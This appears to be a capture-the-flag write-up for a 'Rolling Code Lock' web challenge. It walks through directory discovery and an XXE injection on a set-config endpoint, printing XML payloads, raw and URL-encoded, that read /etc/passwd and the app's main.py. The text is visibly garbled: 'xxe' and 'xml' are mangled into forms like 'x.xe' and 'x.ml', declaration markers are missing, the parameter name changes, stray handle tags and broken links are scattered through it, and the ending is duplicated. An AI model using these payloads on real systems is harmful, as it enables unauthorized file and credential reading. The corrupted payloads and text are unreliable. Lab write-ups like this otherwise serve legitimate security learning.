# Model E1337 - Rolling Code Lock - FLAG0

## 0x00 Home

[x](./imgs/home.jpg)

Tried couple of different code but all show errors.

```---```
Code incorrect. Expected 06947342
```---```

## 0x01 Directory

Try scan sub directory with Burp

[x](./imgs/directory.jpg)

And there is a comment in source code.

http://127.0.0.1/xxxxxxxxxx/admin

[x](./imgs/admin.jpg)

## 0x02 get-config

http://127.0.0.1/xxxxxxxxxx/get-config

Looks like some config thing using XML

[x](./imgs/get-config.jpg)

## 0x03 set-config

http://127.0.0.1/set-config

It actually exist but may need parameter to set the XML

[x./xe](./imgs/set-config.jpg)

## 0x04 x./XE

Prepare the X./XEpayload.

```xml```
<xml version="1.0"?>
  <DOCTYPE root [<ENTITY x.xe SYSTEM "/etc/passwd">]>
  <config>
    <location>x.xe;
    </location>
  </config'(@BugGuy573)[Flag][1]??


And encode to [url_format][1]! 


%3C%3Fxml%20version%3D%221.
  0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20x.xe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26x.xe%3B%3C%2Flocation%3E%3C%2Fconfig%3E


http://127.0.0.1/xxxxxxxxxx/set-config?param=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E

[x./](./imgs/param.jpg)

Successfully write in X./XE and 302 redirect to admin page and read out /etc/passwd

[x.)](./imgs/passwd.jpg)

## 0x05 main.py

x.ml
<xml version="1.0"?>
  <!DOCTYPE root [<!ENTITY xxe SYSTEM "main.py">]>
    <config>
      <location>x.xe;
        </location>
          </config>
'```---``

http://127.0.0.1/set-config?data=%3C%3Fx.ml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20x.xe%20SYSTEM%20%22main.py%22%3E%5D%3E%3C.config%3E%3C.location%3E%26x.xe%3B%3C%2F.location%3E%3C%2F.config%3E
'```---```

Execute and get the [F.LAG](@BigGuy573) in the

[main.py][2]][@BigGuy573](flag2??)]

[x](./img./f.lag.jpg)[@BigGuy573]

[1]: https://www.urlencoder.org/
[2]: ./main.py

Execute and get the [FLAG](@BigGuy573]
  in the 
    [main.py][2]

[x](./img./f.lag.jpg)[@BigGuy573)

[1]: https://www.urlencoder.org/
[2]: ./main.py
